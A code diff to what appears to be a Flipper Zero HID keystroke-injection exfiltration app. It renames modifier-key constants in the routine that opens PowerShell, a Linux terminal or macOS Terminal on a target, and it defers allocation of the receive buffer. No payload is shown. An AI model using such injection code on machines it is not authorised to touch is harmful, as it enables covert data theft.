@@ -148,9 +148,9 @@ static void type_char(char c, uint32_t delay_ms) {
     if(key == 0) return;
 
     if(need_shift) {
-        furi_hal_hid_kb_press(HID_KEYBOARD_L_SHIFT | key);
+        furi_hal_hid_kb_press(KEY_MOD_LEFT_SHIFT | key);
         furi_delay_ms(delay_ms);
-        furi_hal_hid_kb_release(HID_KEYBOARD_L_SHIFT | key);
+        furi_hal_hid_kb_release(KEY_MOD_LEFT_SHIFT | key);
     } else {
         furi_hal_hid_kb_press(key);
         furi_delay_ms(delay_ms);
@@ -194,7 +194,7 @@ static bool phase_inject(HidExfilWorker* worker) {
     switch(worker->config.target_os) {
     case TargetOSWindows:
         /* Win+R to open Run dialog */
-        press_key_combo(HID_KEYBOARD_L_GUI | HID_KEYBOARD_R, 50);
+        press_key_combo(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R, 50);
         furi_delay_ms(500);
         /* Type "powershell" and press Enter */
         type_string("powershell", delay, worker);
@@ -207,13 +207,13 @@ static bool phase_inject(HidExfilWorker* worker) {
 
     case TargetOSLinux:
         /* Ctrl+Alt+T to open terminal */
-        press_key_combo(HID_KEYBOARD_L_CTRL | HID_KEYBOARD_L_ALT | HID_KEYBOARD_T, 50);
+        press_key_combo(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T, 50);
         furi_delay_ms(1000);
         break;
 
     case TargetOSMac:
         /* Cmd+Space for Spotlight */
-        press_key_combo(HID_KEYBOARD_L_GUI | HID_KEYBOARD_SPACEBAR, 50);
+        press_key_combo(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR, 50);
         furi_delay_ms(500);
         /* Type "terminal" and Enter */
         type_string("terminal", delay, worker);
@@ -622,12 +622,10 @@ HidExfilWorker* hid_exfil_worker_alloc(void) {
     if(!worker) return NULL;
     memset(worker, 0, sizeof(HidExfilWorker));
 
-    worker->recv_buffer = malloc(HID_EXFIL_RECV_BUF_SIZE);
-    if(!worker->recv_buffer) {
-        free(worker);
-        return NULL;
-    }
-    worker->recv_buffer_size = HID_EXFIL_RECV_BUF_SIZE;
+    /* recv_buffer is intentionally NOT allocated here.
+     * It is deferred to hid_exfil_worker_start() so that 4 KB of heap
+     * is only consumed when the user actually begins an exfil run,
+     * not every time the app opens. */
 
     worker->thread = furi_thread_alloc_ex("HidExfilWorker", 2048, hid_exfil_worker_thread, worker);
 
@@ -674,16 +672,28 @@ void hid_exfil_worker_configure(
     memcpy(&worker->config, config, sizeof(ExfilConfig));
 }
 
-void hid_exfil_worker_start(HidExfilWorker* worker) {
+bool hid_exfil_worker_start(HidExfilWorker* worker) {
     furi_assert(worker);
     furi_assert(!worker->running);
 
-    /* Clear receive buffer */
+    /* Allocate receive buffer now — deferred from worker_alloc.
+     * If a previous run already allocated it, reuse it (no free/realloc). */
+    if(!worker->recv_buffer) {
+        worker->recv_buffer = malloc(HID_EXFIL_RECV_BUF_SIZE);
+        if(!worker->recv_buffer) {
+            FURI_LOG_E(TAG, "OOM: cannot allocate %u-byte recv buffer", HID_EXFIL_RECV_BUF_SIZE);
+            return false;
+        }
+        worker->recv_buffer_size = HID_EXFIL_RECV_BUF_SIZE;
+    }
+
+    /* Zero only the portion we will use (full buffer on first run). */
     memset(worker->recv_buffer, 0, worker->recv_buffer_size);
     worker->state.bytes_received = 0;
 
     worker->running = true;
     furi_thread_start(worker->thread);
+    return true;
 }
 
 void hid_exfil_worker_stop(HidExfilWorker* worker) {
